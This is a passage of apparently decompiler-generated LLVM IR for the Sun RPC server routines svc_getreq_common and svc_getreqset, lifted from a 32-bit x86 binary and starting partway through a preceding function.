  %v2_8063ef0 = inttoptr i32 %v1_8063ef0 to i32*
  store i32 %v0_8063ef0, i32* %v2_8063ef0, align 4
  store i32 %v0_8063ec8, i32* @esi, align 4
  store i32 %v0_8063ec5, i32* @edi, align 4
  %v0_8063ef4 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063ef4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_8063ee7, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8063edd, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-896 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v4_8063f03 = ptrtoint i32* %stack_var_-1296 to i32
  %v2_8063f0a = ptrtoint i32* %stack_var_-896 to i32
  store i32 %v2_8063f0a, i32* %eax.global-to-local, align 4
  %v1_8063f18 = call i32 @__rpc_thread_variables(i32 %v4_8063f03)
  store i32 %v1_8063f18, i32* %eax.global-to-local, align 4
  %v1_8063f1d = add i32 %v1_8063f18, 180
  %v2_8063f1d = inttoptr i32 %v1_8063f1d to i32*
  %v3_8063f1d = load i32, i32* %v2_8063f1d, align 4
  store i32 %v3_8063f1d, i32* @edx, align 4
  store i32 %v1_8063f18, i32* %ebp.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_8063f2c = mul i32 %arg1, 4
  %v3_8063f2c = add i32 %v3_8063f1d, %v2_8063f2c
  %v4_8063f2c = inttoptr i32 %v3_8063f2c to i32*
  %v5_8063f2c = load i32, i32* %v4_8063f2c, align 4
  store i32 %v5_8063f2c, i32* @ebx, align 4
  %v1_8063f2f = icmp eq i32 %v5_8063f2c, 0
  br i1 %v1_8063f2f, label %entry.dec_label_pc_8064086_crit_edge, label %dec_label_pc_8063f37.preheader

entry.dec_label_pc_8064086_crit_edge:             ; preds = %entry
  %v0_8064086.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064086

dec_label_pc_8063f37.preheader:                   ; preds = %entry
  %v1_8063f39 = add i32 %v5_8063f2c, 8
  %v2_8063f39 = inttoptr i32 %v1_8063f39 to i32*
  %v3_8063fa4 = bitcast i32* %stack_var_-896 to i16*
  %v1_8063f37.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8063f37

dec_label_pc_8063f37:                             ; preds = %dec_label_pc_8063f37.preheader, %dec_label_pc_806407f
  %v1_8063f37 = phi i32 [ %v1_8063f37.pre, %dec_label_pc_8063f37.preheader ], [ %v1_8064069, %dec_label_pc_806407f ]
  %v0_8063f37 = phi i32 [ %arg1, %dec_label_pc_8063f37.preheader ], [ 0, %dec_label_pc_806407f ]
  %v2_8063f37 = add i32 %v1_8063f37, -4
  %v3_8063f37 = inttoptr i32 %v2_8063f37 to i32*
  store i32 %v0_8063f37, i32* %v3_8063f37, align 4
  %v0_8063f38 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063f38 = add i32 %v1_8063f37, -8
  %v3_8063f38 = inttoptr i32 %v2_8063f38 to i32*
  store i32 %v0_8063f38, i32* %v3_8063f38, align 4
  %v3_8063f39 = load i32, i32* %v2_8063f39, align 4
  store i32 %v3_8063f39, i32* %eax.global-to-local, align 4
  %v1_8063f3c = add i32 %v1_8063f37, 1212
  store i32 %v1_8063f3c, i32* @esi, align 4
  %v2_8063f43 = add i32 %v1_8063f37, -12
  %v3_8063f43 = inttoptr i32 %v2_8063f43 to i32*
  store i32 %v1_8063f3c, i32* %v3_8063f43, align 4
  %v2_8063f44 = add i32 %v1_8063f37, -16
  %v3_8063f44 = inttoptr i32 %v2_8063f44 to i32*
  store i32 %v5_8063f2c, i32* %v3_8063f44, align 4
  %v1_8063f45 = add i32 %v1_8063f37, -20
  %v2_8063f45 = inttoptr i32 %v1_8063f45 to i32*
  store i32 134627143, i32* %v2_8063f45, align 4
  %v4_8063f45 = inttoptr i32 %v3_8063f39 to i32*
  %v5_8063f45 = load i32, i32* %v4_8063f45, align 4
  call void @__pseudo_call(i32 %v5_8063f45)
  %v0_8063f47 = load i32, i32* @esp, align 4
  %v1_8063f4a = icmp eq i32 %v3_8063f39, 0
  br i1 %v1_8063f4a, label %dec_label_pc_806405f, label %dec_label_pc_8063f52

dec_label_pc_8063f52:                             ; preds = %dec_label_pc_8063f37
  %v1_8063f52 = add i32 %v0_8063f47, 828
  store i32 %v1_8063f52, i32* %eax.global-to-local, align 4
  %v2_8063f59 = add i32 %v0_8063f47, 1300
  %v3_8063f59 = inttoptr i32 %v2_8063f59 to i32*
  store i32 %v1_8063f52, i32* %v3_8063f59, align 4
  %v0_8063f60 = load i32, i32* @esp, align 4
  %v1_8063f60 = add i32 %v0_8063f60, 1224
  %v2_8063f60 = inttoptr i32 %v1_8063f60 to i32*
  %v3_8063f60 = load i32, i32* %v2_8063f60, align 4
  store i32 %v3_8063f60, i32* %eax.global-to-local, align 4
  %v1_8063f67 = add i32 %v0_8063f60, 1272
  store i32 %v1_8063f67, i32* %edx.global-to-local, align 4
  %v2_8063f6e = add i32 %v0_8063f60, 1288
  %v3_8063f6e = inttoptr i32 %v2_8063f6e to i32*
  store i32 %v5_8063f2c, i32* %v3_8063f6e, align 4
  %v0_8063f75 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063f75 = load i32, i32* @esp, align 4
  %v2_8063f75 = add i32 %v1_8063f75, 1260
  %v3_8063f75 = inttoptr i32 %v2_8063f75 to i32*
  store i32 %v0_8063f75, i32* %v3_8063f75, align 4
  %v0_8063f7c = load i32, i32* @esp, align 4
  %v1_8063f7c = add i32 %v0_8063f7c, 1228
  %v2_8063f7c = inttoptr i32 %v1_8063f7c to i32*
  %v3_8063f7c = load i32, i32* %v2_8063f7c, align 4
  store i32 %v3_8063f7c, i32* %eax.global-to-local, align 4
  %v2_8063f83 = add i32 %v0_8063f7c, 1264
  %v3_8063f83 = inttoptr i32 %v2_8063f83 to i32*
  store i32 %v3_8063f7c, i32* %v3_8063f83, align 4
  %v0_8063f8a = load i32, i32* @esp, align 4
  %v1_8063f8a = add i32 %v0_8063f8a, 1232
  %v2_8063f8a = inttoptr i32 %v1_8063f8a to i32*
  %v3_8063f8a = load i32, i32* %v2_8063f8a, align 4
  %v2_8063f91 = add i32 %v0_8063f8a, 1268
  %v3_8063f91 = inttoptr i32 %v2_8063f91 to i32*
  store i32 %v3_8063f8a, i32* %v3_8063f91, align 4
  %v0_8063f98 = load i32, i32* @esp, align 4
  %v1_8063f98 = add i32 %v0_8063f98, 1236
  store i32 %v1_8063f98, i32* %eax.global-to-local, align 4
  %v0_8063f9f = load i32, i32* @edi, align 4
  %v2_8063f9f = add i32 %v0_8063f98, -4
  %v3_8063f9f = inttoptr i32 %v2_8063f9f to i32*
  store i32 %v0_8063f9f, i32* %v3_8063f9f, align 4
  %v1_8063fa0 = add i32 %v0_8063f98, -8
  %v2_8063fa0 = inttoptr i32 %v1_8063fa0 to i32*
  store i32 12, i32* %v2_8063fa0, align 4
  %v0_8063fa2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063fa2 = add i32 %v0_8063f98, -12
  %v3_8063fa2 = inttoptr i32 %v2_8063fa2 to i32*
  store i32 %v0_8063fa2, i32* %v3_8063fa2, align 4
  %v0_8063fa3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063fa3 = add i32 %v0_8063f98, -16
  %v3_8063fa3 = inttoptr i32 %v2_8063fa3 to i32*
  store i32 %v0_8063fa3, i32* %v3_8063fa3, align 4
  %v4_8063fa4 = call i32 @memcpy(i16* %v3_8063fa4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8063fa4, i32* %eax.global-to-local, align 4
  %v0_8063fa9 = load i32, i32* @esp, align 4
  %v1_8063fac = add i32 %v0_8063fa9, 1252
  %v2_8063fac = inttoptr i32 %v1_8063fac to i32*
  %v3_8063fac = load i32, i32* %v2_8063fac, align 4
  %v4_8063fac = icmp eq i32 %v3_8063fac, 0
  %v1_8063fb4 = icmp eq i1 %v4_8063fac, false
  br i1 %v1_8063fb4, label %dec_label_pc_8063fd5, label %dec_label_pc_8063fb6

dec_label_pc_8063fb6:                             ; preds = %dec_label_pc_8063f52
  %v0_8063fb6 = load i32, i32* @global_var_807f800.744, align 2048
  store i32 %v0_8063fb6, i32* %eax.global-to-local, align 4
  %v1_8063fbb = add i32 %v0_8063fa9, 1304
  %v2_8063fbb = inttoptr i32 %v1_8063fbb to i32*
  %v3_8063fbb = load i32, i32* %v2_8063fbb, align 4
  store i32 %v3_8063fbb, i32* %edx.global-to-local, align 4
  %v2_8063fc2 = add i32 %v3_8063fbb, 32
  %v3_8063fc2 = inttoptr i32 %v2_8063fc2 to i32*
  store i32 %v0_8063fb6, i32* %v3_8063fc2, align 4
  %v0_8063fc5 = load i32, i32* @esp, align 4
  %v1_8063fc5 = add i32 %v0_8063fc5, 1288
  %v2_8063fc5 = inttoptr i32 %v1_8063fc5 to i32*
  %v3_8063fc5 = load i32, i32* %v2_8063fc5, align 4
  store i32 %v3_8063fc5, i32* %eax.global-to-local, align 4
  %v1_8063fcc = add i32 %v3_8063fc5, 40
  %v2_8063fcc = inttoptr i32 %v1_8063fcc to i32*
  store i32 0, i32* %v2_8063fcc, align 4
  br label %dec_label_pc_8063ff7

dec_label_pc_8063fd5:                             ; preds = %dec_label_pc_8063f52
  %v0_8063fd5 = load i32, i32* @ecx, align 4
  %v2_8063fd5 = add i32 %v0_8063fa9, 12
  %v3_8063fd5 = inttoptr i32 %v2_8063fd5 to i32*
  store i32 %v0_8063fd5, i32* %v3_8063fd5, align 4
  %v0_8063fd6 = load i32, i32* @ecx, align 4
  %v2_8063fd6 = add i32 %v0_8063fa9, 8
  %v3_8063fd6 = inttoptr i32 %v2_8063fd6 to i32*
  store i32 %v0_8063fd6, i32* %v3_8063fd6, align 4
  %v0_8063fd7 = load i32, i32* @esi, align 4
  %v2_8063fd7 = add i32 %v0_8063fa9, 4
  %v3_8063fd7 = inttoptr i32 %v2_8063fd7 to i32*
  store i32 %v0_8063fd7, i32* %v3_8063fd7, align 4
  %v1_8063fd8 = add i32 %v0_8063fa9, 1276
  store i32 %v1_8063fd8, i32* %eax.global-to-local, align 4
  %v3_8063fdf = inttoptr i32 %v0_8063fa9 to i32*
  store i32 %v1_8063fd8, i32* %v3_8063fdf, align 4
  %v0_8063fe0 = call i32 @_authenticate()
  store i32 %v0_8063fe0, i32* %eax.global-to-local, align 4
  %v0_8063fe5 = load i32, i32* @esp, align 4
  %v1_8063fe8 = icmp eq i32 %v0_8063fe0, 0
  br i1 %v1_8063fe8, label %dec_label_pc_8063ff7, label %dec_label_pc_8063fec

dec_label_pc_8063fec:                             ; preds = %dec_label_pc_8063fd5
  %v0_8063fec = load i32, i32* @edx, align 4
  %v2_8063fec = add i32 %v0_8063fe5, 12
  %v3_8063fec = inttoptr i32 %v2_8063fec to i32*
  store i32 %v0_8063fec, i32* %v3_8063fec, align 4
  %v0_8063fed = load i32, i32* @edx, align 4
  %v2_8063fed = add i32 %v0_8063fe5, 8
  %v3_8063fed = inttoptr i32 %v2_8063fed to i32*
  store i32 %v0_8063fed, i32* %v3_8063fed, align 4
  %v0_8063fee = load i32, i32* %eax.global-to-local, align 4
  %v2_8063fee = add i32 %v0_8063fe5, 4
  %v3_8063fee = inttoptr i32 %v2_8063fee to i32*
  store i32 %v0_8063fee, i32* %v3_8063fee, align 4
  %v3_8063fef = inttoptr i32 %v0_8063fe5 to i32*
  store i32 %v5_8063f2c, i32* %v3_8063fef, align 4
  %v2_8063ff0 = call i32 @svcerr_auth(i32 %v2_8063f0a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8063ff0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806405c

dec_label_pc_8063ff7:                             ; preds = %dec_label_pc_8063fd5, %dec_label_pc_8063fb6
  %v0_8063ff7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8063ff7 = add i32 %v0_8063ff7, 184
  %v2_8063ff7 = inttoptr i32 %v1_8063ff7 to i32*
  %v3_8063ff7 = load i32, i32* %v2_8063ff7, align 4
  store i32 %v3_8063ff7, i32* @edx, align 4
  store i32 -1, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @ecx, align 4
  %v1_80640303 = icmp eq i32 %v3_8063ff7, 0
  %v1_806403210 = icmp eq i1 %v1_80640303, false
  br i1 %v1_806403210, label %dec_label_pc_8064006.lr.ph, label %dec_label_pc_8064034.thread

dec_label_pc_8064034.thread:                      ; preds = %dec_label_pc_8063ff7
  %v0_8064053.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064053

dec_label_pc_8064006.lr.ph:                       ; preds = %dec_label_pc_8063ff7
  %v1_8064009.pre = load i32, i32* @esp, align 4
  %v2_8064009 = add i32 %v1_8064009.pre, 1260
  %v3_8064009 = inttoptr i32 %v2_8064009 to i32*
  %v2_8064015 = add i32 %v1_8064009.pre, 1264
  %v3_8064015 = inttoptr i32 %v2_8064015 to i32*
  br label %dec_label_pc_8064006

dec_label_pc_8064006:                             ; preds = %dec_label_pc_8064006.lr.ph, %dec_label_pc_806402e
  %v0_806403422 = phi i32 [ 0, %dec_label_pc_8064006.lr.ph ], [ %v0_806403421, %dec_label_pc_806402e ]
  %v1_8064028 = phi i32 [ 0, %dec_label_pc_8064006.lr.ph ], [ %v1_806402819, %dec_label_pc_806402e ]
  %v3_8064025 = phi i32 [ -1, %dec_label_pc_8064006.lr.ph ], [ %v0_806404317, %dec_label_pc_806402e ]
  %v0_806402e = phi i32 [ %v3_8063ff7, %dec_label_pc_8064006.lr.ph ], [ %v2_806402e, %dec_label_pc_806402e ]
  %v1_8064006 = add i32 %v0_806402e, 4
  %v2_8064006 = inttoptr i32 %v1_8064006 to i32*
  %v3_8064006 = load i32, i32* %v2_8064006, align 4
  store i32 %v3_8064006, i32* %eax.global-to-local, align 4
  %v4_8064009 = load i32, i32* %v3_8064009, align 4
  %v15_8064009 = icmp eq i32 %v3_8064006, %v4_8064009
  %v1_8064010 = icmp eq i1 %v15_8064009, false
  br i1 %v1_8064010, label %dec_label_pc_806402e, label %dec_label_pc_8064012

dec_label_pc_8064012:                             ; preds = %dec_label_pc_8064006
  %v1_8064012 = add i32 %v0_806402e, 8
  %v2_8064012 = inttoptr i32 %v1_8064012 to i32*
  %v3_8064012 = load i32, i32* %v2_8064012, align 4
  store i32 %v3_8064012, i32* %eax.global-to-local, align 4
  %v4_8064015 = load i32, i32* %v3_8064015, align 4
  %v15_8064015 = icmp eq i32 %v3_8064012, %v4_8064015
  br i1 %v15_8064015, label %dec_label_pc_8064043, label %dec_label_pc_806401e

dec_label_pc_806401e:                             ; preds = %dec_label_pc_8064012
  store i32 1, i32* @ecx, align 4
  %tmp35 = icmp ule i32 %v3_8064025, %v3_8064012
  %v5_8064025 = select i1 %tmp35, i32 %v3_8064025, i32 %v3_8064012
  store i32 %v5_8064025, i32* @esi, align 4
  %tmp36 = icmp ugt i32 %v3_8064012, %v1_8064028
  br i1 %tmp36, label %dec_label_pc_806402c, label %dec_label_pc_806402e

dec_label_pc_806402c:                             ; preds = %dec_label_pc_806401e
  store i32 %v3_8064012, i32* @edi, align 4
  br label %dec_label_pc_806402e

dec_label_pc_806402e:                             ; preds = %dec_label_pc_806401e, %dec_label_pc_8064006, %dec_label_pc_806402c
  %v0_8064038 = phi i32 [ %v3_8064012, %dec_label_pc_806401e ], [ %v3_8064006, %dec_label_pc_8064006 ], [ %v3_8064012, %dec_label_pc_806402c ]
  %v1_806402819 = phi i32 [ %v1_8064028, %dec_label_pc_806401e ], [ %v1_8064028, %dec_label_pc_8064006 ], [ %v3_8064012, %dec_label_pc_806402c ]
  %v0_806403421 = phi i32 [ 1, %dec_label_pc_806401e ], [ %v0_806403422, %dec_label_pc_8064006 ], [ 1, %dec_label_pc_806402c ]
  %v0_806404317 = phi i32 [ %v5_8064025, %dec_label_pc_806401e ], [ %v3_8064025, %dec_label_pc_8064006 ], [ %v5_8064025, %dec_label_pc_806402c ]
  %v1_806402e = inttoptr i32 %v0_806402e to i32*
  %v2_806402e = load i32, i32* %v1_806402e, align 4
  store i32 %v2_806402e, i32* @edx, align 4
  %v1_8064030 = icmp eq i32 %v2_806402e, 0
  %v1_8064032 = icmp eq i1 %v1_8064030, false
  br i1 %v1_8064032, label %dec_label_pc_8064006, label %dec_label_pc_8064034

dec_label_pc_8064034:                             ; preds = %dec_label_pc_806402e
  %v1_8064034 = icmp eq i32 %v0_806403421, 0
  br i1 %v1_8064034, label %dec_label_pc_8064053, label %dec_label_pc_8064038

dec_label_pc_8064038:                             ; preds = %dec_label_pc_8064034
  %v2_8064038 = add i32 %v1_8064009.pre, -4
  %v3_8064038 = inttoptr i32 %v2_8064038 to i32*
  store i32 %v0_8064038, i32* %v3_8064038, align 4
  %v0_8064039 = load i32, i32* @edi, align 4
  %v2_8064039 = add i32 %v1_8064009.pre, -8
  %v3_8064039 = inttoptr i32 %v2_8064039 to i32*
  store i32 %v0_8064039, i32* %v3_8064039, align 4
  %v0_806403a = load i32, i32* @esi, align 4
  %v2_806403a = add i32 %v1_8064009.pre, -12
  %v3_806403a = inttoptr i32 %v2_806403a to i32*
  store i32 %v0_806403a, i32* %v3_806403a, align 4
  %v2_806403b = add i32 %v1_8064009.pre, -16
  %v3_806403b = inttoptr i32 %v2_806403b to i32*
  store i32 %v5_8063f2c, i32* %v3_806403b, align 4
  %v0_806403c = call i32 @svcerr_progvers()
  store i32 %v0_806403c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806405c

dec_label_pc_8064043:                             ; preds = %dec_label_pc_8064012
  %v2_8064043 = add i32 %v1_8064009.pre, -4
  %v3_8064043 = inttoptr i32 %v2_8064043 to i32*
  store i32 %v3_8064025, i32* %v3_8064043, align 4
  %v0_8064044 = load i32, i32* @esi, align 4
  %v2_8064044 = add i32 %v1_8064009.pre, -8
  %v3_8064044 = inttoptr i32 %v2_8064044 to i32*
  store i32 %v0_8064044, i32* %v3_8064044, align 4
  %v2_8064045 = add i32 %v1_8064009.pre, -12
  %v3_8064045 = inttoptr i32 %v2_8064045 to i32*
  store i32 %v5_8063f2c, i32* %v3_8064045, align 4
  store i32 %v2_8064009, i32* %eax.global-to-local, align 4
  %v2_806404d = add i32 %v1_8064009.pre, -16
  %v3_806404d = inttoptr i32 %v2_806404d to i32*
  store i32 %v2_8064009, i32* %v3_806404d, align 4
  %v1_806404e = add i32 %v1_8064009.pre, -20
  %v2_806404e = inttoptr i32 %v1_806404e to i32*
  store i32 134627409, i32* %v2_806404e, align 4
  %v3_806404e = load i32, i32* @edx, align 4
  %v4_806404e = add i32 %v3_806404e, 12
  %v5_806404e = inttoptr i32 %v4_806404e to i32*
  %v6_806404e = load i32, i32* %v5_806404e, align 4
  call void @__pseudo_call(i32 %v6_806404e)
  br label %dec_label_pc_806405c

dec_label_pc_8064053:                             ; preds = %dec_label_pc_8064034.thread, %dec_label_pc_8064034
  %v0_8064053 = phi i32 [ %v0_8064053.pre, %dec_label_pc_8064034.thread ], [ %v1_8064009.pre, %dec_label_pc_8064034 ]
  %v2_8064056 = add i32 %v0_8064053, -16
  %v3_8064056 = inttoptr i32 %v2_8064056 to i32*
  store i32 %v5_8063f2c, i32* %v3_8064056, align 4
  %v0_8064057 = call i32 @__GI_svcerr_noprog()
  store i32 %v0_8064057, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806405c

dec_label_pc_806405c:                             ; preds = %dec_label_pc_8064043, %dec_label_pc_8064038, %dec_label_pc_8063fec, %dec_label_pc_8064053
  %v0_806405c = load i32, i32* @esp, align 4
  br label %dec_label_pc_806405f

dec_label_pc_806405f:                             ; preds = %dec_label_pc_8063f37, %dec_label_pc_806405c
  %v0_8064062.in = phi i32 [ %v0_8063f47, %dec_label_pc_8063f37 ], [ %v0_806405c, %dec_label_pc_806405c ]
  %v3_806405f = load i32, i32* %v2_8063f39, align 4
  store i32 %v3_806405f, i32* %eax.global-to-local, align 4
  %v3_8064065 = inttoptr i32 %v0_8064062.in to i32*
  store i32 %v5_8063f2c, i32* %v3_8064065, align 4
  %v1_8064066 = add i32 %v0_8064062.in, -4
  %v2_8064066 = inttoptr i32 %v1_8064066 to i32*
  store i32 134627433, i32* %v2_8064066, align 4
  %v4_8064066 = add i32 %v3_806405f, 4
  %v5_8064066 = inttoptr i32 %v4_8064066 to i32*
  %v6_8064066 = load i32, i32* %v5_8064066, align 4
  call void @__pseudo_call(i32 %v6_8064066)
  %v0_8064069 = load i32, i32* @esp, align 4
  %v1_8064069 = add i32 %v0_8064069, 16
  %v1_806406c = icmp eq i32 %v3_806405f, 0
  %v1_806406e = icmp eq i1 %v1_806406c, false
  br i1 %v1_806406e, label %dec_label_pc_806407f, label %dec_label_pc_8064070

dec_label_pc_8064070:                             ; preds = %dec_label_pc_806405f
  %v3_8064070 = load i32, i32* %v2_8063f39, align 4
  store i32 %v3_8064070, i32* %eax.global-to-local, align 4
  %v3_8064076 = inttoptr i32 %v0_8064069 to i32*
  store i32 %v5_8063f2c, i32* %v3_8064076, align 4
  %v1_8064077 = add i32 %v0_8064069, -4
  %v2_8064077 = inttoptr i32 %v1_8064077 to i32*
  store i32 134627450, i32* %v2_8064077, align 4
  %v3_8064077 = load i32, i32* %eax.global-to-local, align 4
  %v4_8064077 = add i32 %v3_8064077, 20
  %v5_8064077 = inttoptr i32 %v4_8064077 to i32*
  %v6_8064077 = load i32, i32* %v5_8064077, align 4
  call void @__pseudo_call(i32 %v6_8064077)
  %v0_806407a = load i32, i32* @esp, align 4
  %v1_806407a = add i32 %v0_806407a, 16
  %v0_8064090.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064086

dec_label_pc_806407f:                             ; preds = %dec_label_pc_806405f
  %v1_806407f = add i32 %v3_806405f, -1
  %v8_806407f = icmp eq i32 %v1_806407f, 0
  store i32 %v1_806407f, i32* %eax.global-to-local, align 4
  br i1 %v8_806407f, label %dec_label_pc_8063f37, label %dec_label_pc_8064086

dec_label_pc_8064086:                             ; preds = %dec_label_pc_806407f, %entry.dec_label_pc_8064086_crit_edge, %dec_label_pc_8064070
  %v0_8064090 = phi i32 [ %arg1, %entry.dec_label_pc_8064086_crit_edge ], [ %v0_8064090.pre, %dec_label_pc_8064070 ], [ %v1_806407f, %dec_label_pc_806407f ]
  %v0_8064086 = phi i32 [ %v0_8064086.pre, %entry.dec_label_pc_8064086_crit_edge ], [ %v1_806407a, %dec_label_pc_8064070 ], [ %v1_8064069, %dec_label_pc_806407f ]
  %v1_8064086 = add i32 %v0_8064086, 1292
  %v6_8064086 = xor i32 %v0_8064086, -2147483648
  %v7_8064086 = and i32 %v1_8064086, %v6_8064086
  %v8_8064086 = icmp slt i32 %v7_8064086, 0
  store i1 %v8_8064086, i1* @of, align 1
  %v1_806408c = inttoptr i32 %v1_8064086 to i32*
  %v2_806408c = load i32, i32* %v1_806408c, align 4
  store i32 %v2_806408c, i32* @ebx, align 4
  %v3_806408c = add i32 %v0_8064086, 1296
  %v1_806408d = inttoptr i32 %v3_806408c to i32*
  %v2_806408d = load i32, i32* %v1_806408d, align 4
  store i32 %v2_806408d, i32* @esi, align 4
  %v3_806408d = add i32 %v0_8064086, 1300
  %v1_806408e = inttoptr i32 %v3_806408d to i32*
  %v2_806408e = load i32, i32* %v1_806408e, align 4
  store i32 %v2_806408e, i32* @edi, align 4
  %v3_806408e = add i32 %v0_8064086, 1304
  %v1_806408f = inttoptr i32 %v3_806408e to i32*
  %v2_806408f = load i32, i32* %v1_806408f, align 4
  store i32 %v2_806408f, i32* @ebp, align 4
  ret i32 %v0_8064090

; uselistorder directives
  uselistorder i32 %v0_8064086, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_806407f, { 0, 2, 1 }
  uselistorder i32 %v3_806405f, { 1, 0, 2, 3 }
  uselistorder i32 %v2_806402e, { 1, 2, 0 }
  uselistorder i32 %v3_8064012, { 4, 0, 1, 3, 7, 6, 5, 2, 8 }
  uselistorder i32 %v3_8064025, { 0, 3, 1, 2 }
  uselistorder i32 %v1_8064028, { 2, 1, 0 }
  uselistorder i32 %v2_8064009, { 1, 0, 2 }
  uselistorder i32 %v1_8064009.pre, { 0, 11, 10, 9, 8, 7, 4, 3, 2, 1, 6, 5 }
  uselistorder i32 %v0_8063fe5, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8063fa9, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8063f37, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8063f2c, { 6, 3, 8, 2, 7, 0, 1, 4, 5, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 -2147483648, { 11, 6, 10, 12, 4, 7, 15, 0, 1, 2, 8, 9, 3, 5, 14, 13 }
  uselistorder i32 (i32, i32)* @svcerr_auth, { 1, 0 }
  uselistorder i32 1304, { 1, 0 }
  uselistorder i32 1300, { 1, 0 }
  uselistorder i32 -20, { 6, 5, 7, 8, 0, 9, 2, 1, 3, 11, 10, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8064086, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806405f, { 1, 0 }
  uselistorder label %dec_label_pc_806405c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8064053, { 1, 0 }
  uselistorder label %dec_label_pc_806402e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064006, { 1, 0 }
  uselistorder label %dec_label_pc_8063f37, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp7 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ebp, align 4
  %v0_8064095 = load i32, i32* @esi, align 4
  %v0_8064096 = load i32, i32* @ebx, align 4
  %v2_806409a = call i32 @_rpc_dtablesize(i32 %v0_8064096, i32 %v0_8064095)
  store i32 %tmp7, i32* @edi, align 4
  %v0_80640e1.pre = load i32, i32* @ebp, align 4
  %v5_80640e525 = icmp slt i32 %v0_80640e1.pre, %v2_806409a
  br i1 %v5_80640e525, label %dec_label_pc_80640a9.lr.ph, label %entry.dec_label_pc_80640e7_crit_edge

entry.dec_label_pc_80640e7_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80640e7

dec_label_pc_80640a9.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80640a9

dec_label_pc_80640a9:                             ; preds = %dec_label_pc_80640a9.lr.ph, %dec_label_pc_80640db
  %v0_80640a926 = phi i32 [ %tmp7, %dec_label_pc_80640a9.lr.ph ], [ %v1_80640db, %dec_label_pc_80640db ]
  %v1_80640a9 = inttoptr i32 %v0_80640a926 to i32*
  %v2_80640a9 = load i32, i32* %v1_80640a9, align 4
  br label %dec_label_pc_80640c9

dec_label_pc_80640ad:                             ; preds = %dec_label_pc_80640c9
  %v0_80640b0 = load i32, i32* @ebp, align 4
  %v2_80640b0 = add i32 %v2_80640cd, -1
  %v3_80640b0 = add i32 %v2_80640b0, %v0_80640b0
  %v1_80640b5 = call i32 @svc_getreq_common(i32 %v3_80640b0)
  %v0_80640ba = load i32, i32* @ebx, align 4
  %v1_80640ba = add i32 %v0_80640ba, -1
  %v2_80640c2 = urem i32 %v1_80640ba, 32
  %v4_80640c2 = icmp eq i32 %v2_80640c2, 0
  br i1 %v4_80640c2, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_80640ad
  %v5_80640c2 = shl i32 1, %v2_80640c2
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_80640ad, %bb
  %v1_80640c7 = phi i32 [ 1, %dec_label_pc_80640ad ], [ %v5_80640c2, %bb ]
  %v0_80640c7 = load i32, i32* @esi, align 4
  %v2_80640c7 = xor i32 %v0_80640c7, %v1_80640c7
  br label %dec_label_pc_80640c9

dec_label_pc_80640c9:                             ; preds = %dec_label_pc_80640a9, %bb16
  %storemerge = phi i32 [ %v2_80640a9, %dec_label_pc_80640a9 ], [ %v2_80640c7, %bb16 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_80640cd = trunc i32 %storemerge to i16
  %v2_80640cd = call i32 @ffs(i16 %v1_80640cd)
  %v1_80640d5 = icmp eq i32 %v2_80640cd, 0
  store i32 %v2_80640cd, i32* @ebx, align 4
  %v1_80640d9 = icmp eq i1 %v1_80640d5, false
  br i1 %v1_80640d9, label %dec_label_pc_80640ad, label %dec_label_pc_80640db

dec_label_pc_80640db:                             ; preds = %dec_label_pc_80640c9
  %v0_80640db = load i32, i32* @edi, align 4
  %v1_80640db = add i32 %v0_80640db, 4
  store i32 %v1_80640db, i32* @edi, align 4
  %v0_80640de = load i32, i32* @ebp, align 4
  %v1_80640de = add i32 %v0_80640de, 32
  store i32 %v1_80640de, i32* @ebp, align 4
  %v5_80640e5 = icmp slt i32 %v1_80640de, %v2_806409a
  br i1 %v5_80640e5, label %dec_label_pc_80640a9, label %dec_label_pc_80640e7

dec_label_pc_80640e7:                             ; preds = %dec_label_pc_80640db, %entry.dec_label_pc_80640e7_crit_edge
  %v0_80640ee.lcssa = phi i32 [ %v2_806409a, %entry.dec_label_pc_80640e7_crit_edge ], [ %v2_80640cd, %dec_label_pc_80640db ]
  ret i32 %v0_80640ee.lcssa

; uselistorder directives
